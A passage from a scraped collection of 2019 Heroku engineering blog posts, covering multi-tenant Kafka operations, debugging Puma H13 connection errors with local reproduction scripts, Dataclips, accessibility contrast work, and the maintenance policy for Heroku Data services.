disproportionately well. There is always more stuff that we can automate. We really, really automate everything. Our team is really, really small so yeah, we automate as much as possible. My colleague, Tom Crayford, has a talk about running hundreds of Kafka clusters with a team of five. I highly recommend to you to take a look at it, he goes into much more detail about our automation. I'm almost done, but some of the limitations. These are the unfortunate side effects of being able to provide what we do. Yeah, we don't allow the admin API, we force explicit topic creation, explicit customer group creation, those are key for access. Thank you very much. I will be taking office hours somewhere nearby and if you want to talk to me more, please do so. Thank you very much. Audience Question: When you're saying you do a lot testing, do you test with enable the encryption on the fly, so basically is that from client to broker you encrypt the data? I guess how much performance hit you see when you do the encryption. By default all of our multi-tenant plans require SSL encryption. There's no way for you not to use it on multi-tenant. We do see a performance hit, but typically it's like a CPU performance hit and almost 100% of our clusters are IO bound and so practical implications are pretty small. The CPU doesn't run hot, but you're testing the limits of IO on the volumes. Audience Question: Do you set up any schema registry to validate those produced input data? Unfortunately schema registry is a Confluent product and so we are not allowed to run a managed schema registry for you, but you can deploy it yourself. Thousands of developers use Heroku’s Apache Kafka service to process millions of transactions on our platform—and many of them do so through our multi-tenant Kafka service. Operating Kafka clusters at this scale requires careful planning to ensure capacity and uptime across a wide range of customer use cases. With significant automation and test suites, we’re able to do this without a massive operations team. In this post, we're going to talk about how we've architected our infrastructure to be secure, reliable, and efficient for your needs, even as your events are processed in a multi-tenant environment. What is Kafka used for? Kafka is a distributed streaming platform, with \"producers\" generating messages and \"consumers\" reading those messages. The message store is written to disk and highly available. Instances that run Kafka are called brokers, and multiple brokers can serve as replicas for your data. If a single broker fails, the replicas are promoted, enabling continued operations with no downtime. Each Kafka cluster comes with a fully-managed ZooKeeper cluster that handles the configuration and synchronization of these different services, including access rights, health checks, and partition management. Kafka is the key enabling technology in a number of data-heavy use cases. Some customers use Kafka to ingest a large amount of data from disparate sources. Some use Kafka to build event-driven architectures to process, aggregate, and act on data in real-time. And others use Kafka to migrate from a monolith to microservices, where it functions  as an intermediary to process events while extracting out embedded functionality into smaller services during the migration process. (You can read all about how SHIFT Commerce did this on our blog .) How Heroku runs Kafka Heroku's least expensive single-tenant plan comes with three brokers. Everything within this cluster belongs to you, and it's a good option if performance and isolation are critical to your application. The trade-off, of course, is that these plans tend to be about fifteen times more expensive than our least expensive multi-tenant plan . The multi-tenant plans are better suited for development and testing environments, or even for applications that simply don't need the immense power of a dedicated cluster. Our multi-tenant plans have feature and operational parity that match our single-tenant offerings: they’re the same number of brokers, the same number of ZooKeeper nodes, and they behave in exactly the same way. While it would have been more cost-effective for us to have provided just a single broker/single ZooKeeper option, we felt that our users would then be developing against something that's not really representative of real life. Instead, we give you access to something that represents what a real production cluster would look like at a fraction of the cost. For example, if your code only acts against a single node, you have no opportunity to anticipate and build for common failure scenarios. When you’re ready to upgrade from a multi-tenant Kafka service to a single-tenant setup, your application is already prepared for it. We're also committed to ensuring that our multi-tenant options are still secure and performant no matter how many customers are sharing a single cluster. The rest of this post goes into more details on how we've accomplished that. Security through isolation Even though many different customers can be situated on a single multi-tenant Kafka cluster, our top priority is to ensure that no one can access anyone else's data. We do this primarily in two ways. First, Kafka has support for access control lists (ACLs) , and it is enforced at the cluster-level. This allows us to specify which users can perform which actions on which topics. Second, we also namespace our resources on a per-tenant level. When you create a new Kafka add-on, we automatically generate a name and associate it with your account, like wabash-58799 . Thereafter, any activity on that resource is only accessible by your application. This guarantees another level of security that is essentially unique to Heroku. A single tenant should also not disturb any of the other tenants on a cluster, primarily when it comes to performance. Your usage of Kafka should not degrade if another Heroku user is processing an immense number of events. To mitigate this, Kafka supports quotas for producers/consumers, and we enforce the number of bytes per second a user can write or read. This way, no matter how many events are available to act upon, every user on the cluster is given their fair share of computing resources to respond. Keeping Kafka available When you buy Kafka from Heroku, we immediately provision the full set of resources that you purchased; we never take shortcuts or overprovision workloads. When it comes to storage, for example, we will automatically expand the amount of disk space you have available to use. If you reach 80% of your quota, we will expand that hard drive so that you can continue to write data to Kafka. We'll keep expanding it (while sending you email reminders that you've exceeded your capacity) so as to not interrupt your workflow. If you go far above your limit without addressing the problem, we'll throttle your throughput, but still keep the cluster operational for you to use. In many cases, for our sake and yours, we set configuration defaults that are sane and safe, and often times even higher than what Kafka initially recommends. Some of these include higher partition settings (from one to eight, to maximize throughput), additional replicas (from one to three, to ensure your data is not lost), and\nmore in-sync replicas (from one to two, to truly confirm that a replica received a write). Applying our tests to production We tested our Kafka infrastructure across a variety of permutations in order to simulate how the multi-tenant clusters would behave in the real world. In order to find the most optimal configurations and observe how Kafka's performance changed, we tried multiple combinations, from throughput limits to the maximum number of partitions. Similarly, we replicated several failure scenarios, to see whether the service could survive unexpected changes. We would hammer a cluster with a million messages, and then take one of the brokers offline. Or, we'd operate a cluster normally, and then decide to stop and restart the server, to verify whether the failover process works. Our tests create an empty cluster, and then generate 50 users that attach the Kafka add-on to their application; they then create many producers and consumers for these simulated users. From there, we define usage profiles for each user. For example, we'll say that 10% of our users send very small amounts of traffic, and 20% of them send very large messages but at a very slow speed, and then the rest of them do some random distribution of data. Through this process, and while gradually increasing the number of users, we’re able to determine the multi-tenant cluster’s operational limits. From these incidents and observations, we were able to identify issues in our setups and adjusted assumptions to truly make the infrastructure resilient, before they became problems for our users. For a deeper look into how we’ve set up all this testing and automation, my colleague Tom Crayford has given a talk called “ Running Hundreds of Kafka Clusters with 5 People .” More information If you'd like to learn more about how we operate Kafka, or what our customers have built with this service, check out our previous blog posts . Or, you can watch this demo for a more technical examination on what Apache Kafka on Heroku can do for you. ZooKeeper microservices kafka", "date": "2019-07-11,"},
{"website": "Heroku", "title": "Puma 4: Hammering Out H13s—A Debugging Story", "author": ["Richard Schneeman"], "link": "https://blog.heroku.com/puma-4-hammering-out-h13s-a-debugging-story", "abstract": "Puma 4: Hammering Out H13s—A Debugging Story Posted by Richard Schneeman July 12, 2019 Listen to this article For quite some time we've received reports from our larger customers about a mysterious H13 - Connection closed error showing up for Ruby applications. Curiously it only ever happened around the time they were deploying or scaling their dynos. Even more peculiar, it only happened to relatively high scale applications. We couldn't reproduce the behavior on an example app. This is a story about distributed coordination, the TCP API, and how we debugged and fixed a bug in Puma that only shows up at scale. Connection closed First of all, what even is an H13 error? From our error page documentation: This error is thrown when a process in your web dyno accepts a connection, but then closes the socket without writing anything to it.\nOne example where this might happen is when a Unicorn web server is configured with a timeout shorter than 30s and a request has not been processed by a worker before the timeout happens. In this case, Unicorn closes the connection before any data is written, resulting in an H13. Fun fact: Our error codes start with the letter of the component where they came from. Our Routing code is all written in Erlang and is named \"Hermes\" so any error codes from Heroku that start with an \"H\" indicate an error from the router. The documentation gives an example of an H13 error code with the unicorn webserver, but it can happen any time a connection is closed via a server, but there has been no response written. Here’s an example showing how to reproduce a H13 explicitly with a node app . What does it mean for an application to get an H13? Essentially every one of these errors correlates to a customer who got an error page. Serving a handful of errors every time the app restarts or deploys or auto-scales is an awful user experience, so it's worth it to find and fix. Debugging I have maintained the Ruby buildpack for several years, and part of that job is to handle support escalations for Ruby tickets. In addition to the normal deployment issues, I've been developing an interest in performance, scalability, and web servers (I recently started helping to maintain the Puma webserver). Because of these interests, when a tricky issue comes in from one of our larger customers, especially if it only happens at scale, I take particular interest. To understand the problem, you need to know a little about the nature of sending distributed messages. Webservers are inherently distributed systems, and to make things more complicated, we often use distributed systems to manage our distributed systems. In the case of this error, it didn't seem to come from a customer's application code i.e. they didn't seem to have anything misconfigured. It also only seemed to happen when a dyno was being shut down. To shut down a dyno two things have to happen, we need to send a SIGTERM to the processes on the dyno which tells the webserver to safely shutdown . We also need to tell our router to stop sending requests to that dyno since it will be shut down soon. These two operations happen on two different systems. The dyno runs on one server, the router which serves our requests is a separate system. It's itself a distributed system. It turns out that while both systems get the message at about the same time, the router might still let a few requests trickle into the dyno that is being shut down after it receives the SIGTERM . That explains the problem then, right? The reason this only happens on apps with a large amount of traffic is they get so many requests there is more chance that there will be a race condition between when the router stops sending requests and the dyno receives the SIGTERM . That sounds like a bug with the router then right? Before we get too deep into the difficulties of distributed coordination, I noticed that other apps with just as much load weren't getting H13 errors. What did that tell me? It told me that the distributed behavior of our system wasn't to blame. If other webservers can handle this just fine, then we need to update our webserver, Puma in this case. Reproduction When you're dealing with a distributed system bug that's reliant on a race condition, reproducing the issue can be a tricky affair. While pairing on the issue with another Heroku engineer, Chap Ambrose , we hit an idea. First, we would reproduce the H13 behavior in any app to figure out what curl exit code we would get, and then we could try to reproduce the exact failure conditions with a more complicated example. A simple reproduction rack app looks like this: app = Proc.new do |env|\n  current_pid = Process.pid\n  signal      = \"SIGKILL\"\n  Process.kill(signal, current_pid)\n  ['200', {'Content-Type' => 'text/html'}, ['A barebones rack app.']]\nend\n\nrun app When you run this config.ru with Puma and hit it with a request, you'll get a connection that is closed without a request getting written. That was pretty easy. The curl code when a connection is closed like this is 52 so now we can detect when it happens. $ curl localhost:9292\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0\ncurl: (52) Empty reply from server A more complicated reproduction happens when SIGTERM is called but requests keep coming in. To facilitate that we ended up with a reproduction that looks like this: app = Proc.new do |env|\n  puma_pid = File.read('puma.pid').to_i\n  Process.kill(\"SIGTERM\", puma_pid)\n  Process.kill(\"SIGTERM\", Process.pid)\n\n  ['200', {'Content-Type' => 'text/html'}, ['A barebones rack app.']]\nend\n\nrun app This config.ru rack app sends a SIGTERM to itself and it's parent process on the first request. So other future requests will be coming in when the server is shutting down. Then we can write a script that boots this server and hits it with a bunch of requests in parallel: threads = []\n\nthreads << Thread.new do\n  puts `puma > puma.log` unless ENV[\"NO_PUMA_BOOT\"]\nend\n\nsleep(3)\nrequire 'fileutils'\nFileUtils.mkdir_p(\"tmp/requests\")\n\n20.times do |i|\n  threads << Thread.new do\n    request = `curl localhost:9292/?request_thread=#{i} &> tmp/requests/requests#{i}.log`\n    puts $?\n  end\nend\n\nthreads.map {|t| t.join } When we run this reproduction, we see that it gives us the exact behavior we're looking to reproduce. Even better, when this code is deployed on Heroku we can see an H13 error is triggered: 2019-05-10T18:41:06.859330+00:00 heroku[router]: at=error code=H13 desc=\"Connection closed without response\" method=GET path=\"/?request_thread=6\" host=ruby-h13.herokuapp.com request_id=05696319-a6ff-4fad-b219-6dd043536314 fwd=\"<ip>\" dyno=web.1 connect=0ms service=5ms status=503 bytes=0 protocol=https You can get all this code and some more details on the reproduciton script repo . And here's the Puma Issue I was using to track the behavior Closing the connection closed bug With a reproduction script in hand, it was possible for us to add debugging statements to Puma internals to see how it behaved while experiencing this issue. With a little investigation, it turned out that Puma never explicitly closed the socket of the connection. Instead, it relied on the process stopping to close it. What exactly does that mean? Every time you type a URL into a browser, the request gets routed to a server. On Heroku, the request goes to our router. The router then attempts to connect to a dyno (server) and pass it the request. The underlying mechanism that allows this is the webserver (Puma) on the dyno opening up a TCP socket on a $PORT. The request is accepted onto the socket, and it will sit there until the webserver (Puma) is ready to read it in and respond to it. What behavior do we want to happen to avoid this H13 error? In the error case, the router tries to connect to the dyno, it's successful, and since the request is accepted by the dyno, the router expects the dyno to handle writing the request. If instead, the socket is closed when it tries to pass on the request it will know that Puma cannot respond. It will then retry passing the connection to another dyno. There are times when a webserver might reject a connection, for example, if the socket is full (default is only to allow 1024 connections on the socket backlog), or if the entire server has crashed. In our case, closing the socket is what we want. It correctly communicates to the router to do the right thing (try passing the connection to another dyno or hold onto it in the case all dynos are restarting). So then, the solution to the problem was to close the socket before attempting to shut down explicitly. Here's the PR . The main magic is just one line: @launcher.close_binder_listeners If you're a worrier (I know I am) you might be afraid that closing the socket prevents any in-flight requests from being completed successfully. Lucky for us closing a socket prevents incoming requests but still allows us to respond to existing requests. If you don't believe me, think about how you could test it with one of my above example repos. Testing distributed behavior I don't know if this behavior in Puma broke, or maybe it never worked. To try to make sure that it continues to work in the future, I wanted to write a test for it. I reached out to dannyfallon who has helped out on some other Puma issues, and we remote paired on the tests using Tuple . The tests ended up being not terribly different than our example reproduction above , but it was pretty tricky to get it to have consistent behavior. With an issue that doesn't regularly show up unless it's on an app at scale, it's essential to test, as Charity Majors would say \"in production\". We had several Heroku customers who were seeing this error try out my patch. They reported some other issues, which we were able to resolve, after fixing those issues, it looked like the errors were fixed. Rolling out the fix Puma 4, which came with this fix, was recently released . We reached out to a customer who was using Puma and seeing a large number of H13s, and this release stopped them in their tracks. Learn more about Puma 4 below. By the coders who brought you Llamas in Pajamas. A new cinematic Ruby server experience. Directed by @evanphx , cinematography by @nateberkopec , produced by @schneems . Introducing - Puma: 4 Fast 4 Furious https://t.co/06PG0lzubk pic.twitter.com/O1dLfwnctJ — Richard Schneeman 🤠 (@schneems) June 25, 2019 debugging puma ruby", "date": "2019-07-12,"},
{"website": "Heroku", "title": "Dataclips Power Insights at Heroku", "author": ["Becky Jaimes"], "link": "https://blog.heroku.com/how-dataclips-power-insights-at-heroku", "abstract": "Dataclips Power Insights at Heroku Posted by Becky Jaimes July 15, 2019 Listen to this article Every organization needs to be data-driven in order to be successful. Whether you're tracking an application's performance, incoming support tickets, or revenue rates, different components of any company depend on metrics that inform the health of the business. At Heroku, we're hackers to the core, but that doesn't mean we're all programmers. We build on top of our own platform for everything we do, and one of the products we often use is Heroku Dataclips. If you haven't heard of them before, Heroku Dataclips allow you to create SQL queries in a web GUI that run on your Heroku Postgres database. The unique dataclip URL can then be shared internally or externally, and the results are even accessible through an HTTP endpoint that returns data in either CSV or JSON. Web GUI for Heroku Dataclips We gathered a few stories from Heroku employees across various departments that show just how powerful these queries can be. The easiest way to see what matters With all of your data already stored in a production database, you have everything you need to start extracting useful insights into how your users are interacting with your application. Traditionally, pulling this information out has been restricted to individuals with access to these systems—namely, engineers or DBAs. If you need to find out how many new users created accounts, grouped by the month, and you're part of a department without production access, you're stuck asking someone else to gather that information for you. We've seen first hand that one of the benefits of Dataclips has been to reduce bottlenecks and democratize access to this information. If that same SELECT query is stored as a dataclip, the person asking for the information can get at fresh data any time they want. Individuals can grab the unique URL generated by a dataclip and share it through email or Slack; rather than repeatedly asking for updates, they’re empowered to get the data themselves. Even better, every dataclip also exposes a URL that represents the resulting data set in JSON format. You can choose to create a simple, lightweight dashboard app (as some of our customers have done) that periodically pings this endpoint to draw charts that visualize the live data. Identifying product usage Product managers ask a common question when building a new feature: \"how many people are using it?\" When we launched the Heroku Button , a one-click process to deploy an application directly from an open-source project, we wanted to be able to track its usage. With each new button generated, we knew how many were being created, because new rows were generated in the database. And, since clicking the button created a new row in our deployments table, we were able to distinguish precisely which came from the CLI and which came from the button. Our product and marketing teams could then take that generic SELECT and create their own analytics. In fact, our Heroku Buttons page is powered by a dataclip; we’re able to automate this presentation by periodically fetching JSON data from a dataclip URL. Another opportunity for Dataclips has been to track the use of deprecated features. For example, we recently began the end-of-life window for Cedar-14 . Our team was easily able to query all the applications still relying on this outdated stack and generate an email campaign that notified all of our users of its imminent sunset. Doing this with a tool that didn’t have access to our production database would require emailing a list around, and would likely fall woefully out of date. With the transparency around production data available through a dataclip, we've also been better able to investigate and triage suspicious behavior. For example, if a massive wave of signups is being generated from the same location, we have a reasonably high certainty that it's a pattern of abuse. Engineers can write queries that pinpoint the sources of these bursts of activity and share the results in a Slack room. Being able to drop a link that fosters a transparent decision-making process and makes for a quick turn around to solving a problem, as multiple people are able to assess and discuss it. It's much more nerve-wracking to hop into a production database and run a specific query to drop a banhammer without first getting several validating approvals from your colleagues. Teaching the entire organization Being a data-driven organization means that everyone in the organization should be able to get the information that they need. We recognize that while dataclips grant accessibility, there's still a massive barrier to using them in the form of a three letter acronym that can conjure dread in even the most senior developer: SQL. To help individuals become self-sufficient, our Business Operations team hosts an Office Hours session designed to teach Herokai about the fundamentals of writing a query using SQL and our internal data schema. Often, someone will join a session with a single question—\"How can I get a list of all the add-ons that a customer is using?\"—and inevitably, this leads to another one—\"Can you get me a list of all the add-ons from Customer Y, too?\" Rather than deliver one-off answers, it's much better to teach people how they can craft a query on their own. This has a network effect of spreading knowledge. It also gives them a new technical skill that they can use forever. We are answering ten future generations of questions by teaching the basics of writing that first query. How it operates The Heroku platform that we build on is exactly the same that's available for our users. Here's a little insight into how we've configured our dataclips to support querying all of our data safely. Queries from Dataclips can run on any Heroku Postgres database available to your organization (except Shield Tier plans ). But bad SQL queries can lock up a table and potentially impact production performance. To mitigate this, we instead run all of our queries against a Postgres follower database . A follower database is a read-only replica of your main, or leader, database. Writes made to the leader database propagate to any follower databases in close to real-time. This means that any dataclip query can be safely made on a database with production data without any impact on an application's systems. People can be given permission to read from this follower database, while the leader database is kept restricted to individuals for whom this access is necessary for their job. Finding out more about Dataclips We've only scratched the surface of what Dataclips can do—did you know you can embed them directly into Google Sheets , too? To learn more about Heroku Dataclips, check out our article on Dev Center . We also recorded two episodes recently about Dataclips on Code[ish] , our podcast exploring technology and the lives of modern developers. The first one is about how Kajabi uses Dataclips by integrating results into their Slack chatbot , and the second is an interview with Becky Jaimes , the product manager for Heroku Dataclips, on recent improvements and the future of Dataclips. Be sure to give those a listen! postgres sql dataclips", "date": "2019-07-15,"},
{"website": "Heroku", "title": "Equality Through Accessibility", "author": ["Ariana Escobar", "Jamie White"], "link": "https://blog.heroku.com/equality-through-accessibility", "abstract": "Equality Through Accessibility Posted by Ariana Escobar and Jamie White August 15, 2019 Listen to this article This is the first post in a two-part series about accessibility. Part two shares our design and development process addressing one aspect of accessibility in the Heroku product. Equality as a Salesforce Value We at Salesforce firmly believe that access to information and the ability to contribute to our digital environment should be recognized as basic human rights, not a nice-to-have features. Globally, hundreds of millions of people have physical, speech, cognitive, and neurological disabilities, and while in practice accessibility is about designing for users with disabilities, it also benefits everyone. Most of us have experienced conditions that impair our ability to get work done at some point in our lives; anything from a having broken arm to being in a noisy or dimly lit room. \"The power of the web is in its universality. Access by everyone regardless of disability is an essential aspect.\" —Tim Berners-Lee, W3C Director and Inventor of the World Wide Web. The current demand for accessible products and services is high and the number of people with disabilities and/or functional limitations will increase significantly with the aging of the population and the diversification of those using technology in their everyday lives. A company whose products and services are more accessible allows for more inclusion and participation in its ecosystem. Salesforce takes this principle extremely seriously, and we consider it a direct application of our core company value of Equality and its pillars of equal rights, equal education, and equal opportunity for all. You can read more about our public commitment towards accessibility . But improving accessibility is not just the right thing to do, it's also a smart thing to do. Creating accessible products and services forces you to consider your product's user experience in a holistic way, delivering exactly what your users need, extending your market reach, minimizing legal risks, and driving innovation. Accessibility and Universal Design as our Way of Practicing Equality \"Equality is accessibility. If you don’t have accessibility you don’t have equality.\" —Marc Benioff, Salesforce's founder, chairman, and co-CEO Universal design refers to the design of products, environments, and services that are usable by all people, to the greatest extent possible, without the need for adaptation or specialized design. The web is an ideal place to ensure the principles of universal design, as it breaks down barriers and enhances capabilities that the physical world can't provide. As with any good design, its value comes from a conscious and proactive decision and effort. We, as professional designers and developers, must decide to build accessible products. It's not in our company values nor in our personal ones to exclude anyone from using our products and services. Web accessibility means that people with diverse capabilities can perceive, operate, navigate, understand, and interact with the web, as well as design, develop, and contribute to the digital environment. In plain terms, this means ensuring that our users can, among other things: Perceive our content Interact with our products with a mouse, a keyboard, or a screen reader Understand errors and messages Salesforce has already and continues to invest in this fundamental part of product development, and Heroku, as part of Salesforce’s Ohana, is committed to the same important goals. In the next post in this series, we'll share our experience evaluating and addressing one aspect of accessibility: contrast ratio. This is the first of many accessibility initiatives we’ll invest in within Heroku, and we’ll continue to spread our learnings and experiences on building an accessible product with the hope of inspiring and guiding others on this very important mission. equality values a11y design UX accessibility", "date": "2019-08-15,"},
{"website": "Heroku", "title": "Designing for Accessibility: Contrast Ratio", "author": ["Ariana Escobar", "Jamie White"], "link": "https://blog.heroku.com/designing-for-accessibility-contrast-ratio", "abstract": "Designing for Accessibility: Contrast Ratio Posted by Ariana Escobar and Jamie White August 21, 2019 Listen to this article This is the second post in a two-part series about accessibility. The first post shares why designing for accessibility is important to us and why we encourage you to incorporate it into your software design process. Heroku’s first accessibility initiative was to reach Level AA for luminance contrast ratio as defined by the internationally recognized best practices of the Web Content Accessibility Guidelines (WCAG) 2.0 .  This ratio guarantees the legibility of text against its background, in order to ensure all users can perceive Heroku’s user interfaces equally. This benefits people with color-vision deficiencies (like Deuteranopia or Protanopia which affect 7 to 12% of men), age-related low vision conditions (like macular degeneration or diabetic retinopathy) and those with presbyopia, the natural aging process of, well, needing glasses. These conditions reduce sensitivity to contrast, and in some cases reduce the ability to distinguish colors. Color is a key aspect of design but it's clearly not perceived the same way by everyone (color even signifies different things to different cultures). That's why it's important to offer a minimum contrast and not rely exclusively on colors for relaying information or functions. The specifics of the WCAG guidelines ( 1.4.3 Contrast ) define that: All normal-sized text require a luminance contrast ratio of at least 4.5:1, and All large-sized text require a luminance contrast ratio of at least 3:1 These guidelines served as a pretty SMART goal for this initiative, driving the effort from the first proposal to the final deployment. The Design Proposal Audit Our first obvious next step was to perform an audit of our existing color palette. We used Contrast Grid to map out all the possible text and background color combinations the color palette could offer. Grid of Heroku’s previous palette combinations and their respective contrast ratios We only use a very small percentage of color combinations from that grid but it was a helpful tool to quickly see which combos reached the minimum contrast ratio and which didn’t. Proposed changes We then listed all the combinations that needed more contrast and proposed new colors to meet the minimum. These are just a few examples of the proposed changes. Comparison of legibility and contrast ratios of our old and proposed new gray and blue colors In order to keep a consistent selection of shades from the same gray hue, we realized that we needed further changes to the palette. So we ended up changing two other tones and getting rid of one, since a darker starting point meant less noticeable variation. Comparison of our old and proposed dark grayscale palette in which the only changes are two new color values for our lightest grays Comparison of our old and proposed dark grayscale palette in which we get rid of one of the lightest colors We proposed several other changes on the complete grayscale palette, like getting rid of colors, defining which colors could be used with a light or dark background or changes in names. Comparison of our old and proposed complete grayscale palette in which we get rid of two colors and change multiple color values and names Final grayscale palette proposal: Final complete grayscale palette proposal with all the proposed changes These changes gave us a solid, consistent, and above all, accessible color palette for our product. Grid of Heroku’s new palette combinations and their respective contrast ratios showing better results than the previous one Once we began the implementation planning process, we realized how much overhead all these small changes added and how long it would take to implement them on all our product, websites, and other marketing graphics. We then decided to scope it down and came up with a second proposal. This new one kept the changes to the darker grays but didn’t remove any color or change any name — it maintained unnecessary colors and inconsistent names but solved our accessibility concerns with a time investment we could afford. Comparison of our old complete grayscale palette with our first and second proposals The Implementation Heroku’s graphic user interfaces (GUIs) are built using our deceptively simple design and icon systems, Purple 3 and Malibu . Purple 3 takes a functional approach to CSS, using the popular Tachyons framework as its foundation and providing a carefully composed set of utility classes (that is to say, CSS classes that do one very focused thing). Malibu complements Purple 3 by providing a library of icons lovingly crafted by our design team. Together, Purple 3 and Malibu provide everything we need to build our GUIs in a manner that is flexible whilst maintaining consistency. The proposed new color palette touches every part of our GUIs so we knew we couldn’t simply release new versions of Purple 3 and Malibu and hope for the best—we needed an approach that would allow us to rigorously audit the changes before releasing them to customers. Fortunately, we happen to build a platform that provides the ideal tool for this kind of situation: Review Apps . When our design team opened their pull request introducing the new color palette to Purple 3 and Malibu, the Heroku platform automatically generated a review app containing the new production-ready CSS and SVG assets on a dedicated URL. To try the new assets out in our Dashboard GUI, all we needed to do was open a pull request swapping in the new URL and, hey presto, a review app demonstrating the new color palette sprang into existence ready to be audited. It’s not always easy to predict how the components of a design system will end up being combined in practice, especially in a large app with many features added over many years. We had to ensure we were improving the legibility of common elements such as form labels, notifications, and warnings, but also more exotic elements such as our metrics charts. For the most part, we were very happy with how the improvements worked in practice and were even happier to see the number of color contrast violations in our GUIs drop by an order of magnitude. Straying slightly outside of the proposed new grays, we discovered that finding a shade of orange that met our standards for contrast, legibility, and aesthetic elegance was surprisingly challenging! Color contrast violations across Heroku Dashboards’s top 10 most visited pages (checked with axe-core 3.2.2) Note: these numbers are adjusted slightly to account for a particular element that isn’t audited accurately by axe-core at present. They are also not universal, but rather reasonably representative of using Heroku with an average number of apps and other entities on display. Once our teams had taken the time to audit each of our GUIs and we were confident we hadn’t regressed legibility in any areas, we rolled out the change to customers. In the end, a mix of solid research, theory, tools, and attention to detail got us to where we wanted to be—a GUI that is every bit as elegant as before but now markedly more accessible. The Result A small change with a big impact The new color palette has been rolled out across all of the Heroku Dashboard. When you visit any page in the Dashboard, you will find improved color contrasts that are a result of the work that has been done. While it can be hard to discern the improvement in legibility from one day to the next, the impact is much easier to spot when looking at the before and after interfaces side-by-side. Below are two identical screenshots of the Spaces section of the Heroku Dashboard with the old colors on the left and the new colors on the right. Note the darker gray (1) and blue (2) text. Screenshots of Heroku Spaces section of Dashboard showing impact of increased contrast on gray and blue text The screenshots of the Dashboard below show the impact of increased color contrast on other elements beyond text such as badges (1) and icons (2). Screenshots of Heroku Dashboard showing impact of increased color contrast on badge and icon elements Our color palette changes are reflected equally in mobile browsers, where small screen sizes and lower resolution can present additional challenges to legibility. Below are before and after examples of our review apps page in a mobile browser. For example, compare the \"REVIEW APPS\" (1) and \"Create a review app from a branch\" (2) text. Before and after examples of our review apps page in a mobile browser We are proud that Heroku's Dashboard is now more legible by people with low contrast sensitivity or color blindness, that it is more legible in different lighting conditions, and that it is easier to read by everyone. What’s Next? Invest in tooling to keep us accessible We use both Ember and React to build our web interfaces and happily both communities take accessibility extremely seriously. For the purposes of this post, we’ll focus on Ember’s tooling. In the Ember community, the Ember A11y group is responsible for advocacy and tooling around accessibility. Among the tools they maintain is ember-a11y-testing , a tool that plugs into Ember’s opinionated testing framework and makes it easy to run an accessibility audit (powered by industry-standard axe-core ) at key moments during acceptance tests. In practice, it looks like this: test('browsing apps', async function(assert) {\n  await visit('/apps');\n\n  a11yAudit();\n\n  assert.dom('.apps-list').containsText('My App');\n}); If we were to introduce an accessibility violation (for example, insufficient color contrast) then our test will fail and tell us exactly what we’ve done wrong: Example of a failing accessibility test To make extra sure we’re using these tools diligently, we’re also experimenting with adding linting rules to ensure acceptance tests contain accessibility audits: Example of linting rule failure We’re incredibly excited to be bringing these tools to our development workflow, both as a means to keep our apps accessible and because they play an important role in teaching accessibility best practices. Accessibility best practices across our UIs This work is one step in making Heroku more accessible and we know there is more to do. There are other aspects of accessibility for us to consider for the Dashboard. We also have a number of other user interfaces to consider beyond the Heroku Dashboard, including the Elements Marketplace , Dev Center , and our Heroku Command Line Interface. Our next step is to complete an audit that will give us a fuller understanding of accessibility across our product surface area and the work to be done. Invitation for feedback We’d love to get your feedback and learn about what else you’d like to see. Drop us an email to feedback@heroku.com .", "date": "2019-08-21,"},
{"website": "Heroku", "title": "Why Frequent Maintenances Are Essential for Secure Heroku Data Services", "author": ["Scott Truitt"], "link": "https://blog.heroku.com/frequent-maintenances-for-secure-heroku-data-services", "abstract": "Why Frequent Maintenances Are Essential for Secure Heroku Data Services Posted by Scott Truitt July 23, 2019 Listen to this article There are many reasons to choose Heroku Data services, but keeping the services you use secure and up-to-date rank near the top. This foundation of trust is the most important commitment we make to our customers, and frequent and timely maintenances are one way we deliver on this promise. We do everything we can to minimize downtime, which is typically between 10 – 60 seconds per maintenance. There are ways for you to minimize disruption too (see the tips and tricks below). The rest of the post explains how we think about Heroku Data maintenances, how we perform them, and when we perform them. An Ounce of Prevention... Hackers exploit known but unpatched vulnerabilities or out-of-date software. Minimizing the time between when a patch or update becomes available and when it gets deployed is the most effective means of limiting damage. There’s nothing worse than seeing your company’s high-profile breach at the top of Hacker News and the Wall Street Journal. This business and reputation risk is real. Like you, we’re faced with the same choice. We believe it’s best to budget some prevention time upfront for patching and updating data services. Otherwise, an incident may cost us (and you) a larger amount of remediation time and effort , to say nothing of the potential damage done to our (and your) brand, business, and customers. That’s why we invest significant engineering, security, and operations effort into creating a proactive security posture that keeps your stack up-to-date through frequent, scheduled maintenances. Security Starts with Sound Design Principles and Policies All Heroku Data services are fully-managed by dedicated experts. We design and optimize our Postgres, Redis, and Apache Kafka services for uptime, performance, security, scaling, upgrades, support, and much more. The initial building of services with these attributes is only half the work. We continually update them, both to counter new threats and deliver new capabilities. We do this for you—automatically and with minimal disruption—during maintenance windows. We ask all Heroku Data customers to choose a weekly four-hour maintenance window at a time when your business and customer impact is low. When necessary, we use this window to update your data services. We bias toward the beginning of your window whenever possible. And again, we typically need no more than 10 – 60 seconds per maintenance. Normal maintenances, when we apply non-critical patches and updates, happen approximately every 30 – 60 days. We schedule them in advance and aim to give you at least three days notice before your window. You can change your Postgres maintenance window or your Redis maintenance window at any time. You can also choose to manually trigger a maintenance at any time outside of your window. You can defer a normal maintenance, but it will eventually go through during the last available maintenance window. Critical Vulnerabilities Require a Decisive Response We are fortunate at Heroku to have a Security team that constantly triages vulnerabilities, assesses the proper response, and defines the timeline to act. Together, Data and Security form a rapid response team capable of removing critical vulnerabilities from our fleet of millions of customer databases in days, not weeks. Given the size of our platform and the community relationships we’ve formed over many years, we often hear about CVEs (Common Vulnerabilities and Exposures) before public disclosure. In the rare event that we determine that the potential for damage is severe, we will mitigate the risk outside of your normal maintenance window. Due to the confidential and sensitive nature of embargoed CVEs, we may not always be able to tell you why we’re running the maintenance at the time. We will tell you after the embargo is lifted. Recent examples include a Postgres vulnerability that we detected and an embargoed Redis vulnerability , both patched before public notice. Tips and Tricks Proactive, regular maintenances require good hygiene around app development and database connectivity. Fact is, cloud data services are ephemeral, albeit on a much longer time scale than app containers. It’s good engineering practice to treat data services as transient and test against failure scenarios. You may never experience an adverse event in production, but at least you will be ready. On that note, we've prepared the following updates to our documentation to help you understand and manage the impact of maintenances: For Postgres customers: Will my app experience downtime? How do I minimize downtime? For Redis customers: Will my app experience downtime For Kafka customers: Resilient app development for Kafka Please also ensure that your account email is correct so that you’ll receive maintenance notifications. Feedback Welcome Our mission is the same, whether you’re using a free Hobby database or a premium, highly-compliant Shield database; we see frequent and timely maintenances as a key feature of secure and up-to-date Heroku Data services. If you have any questions or concerns, please reach out to your account team or email data at 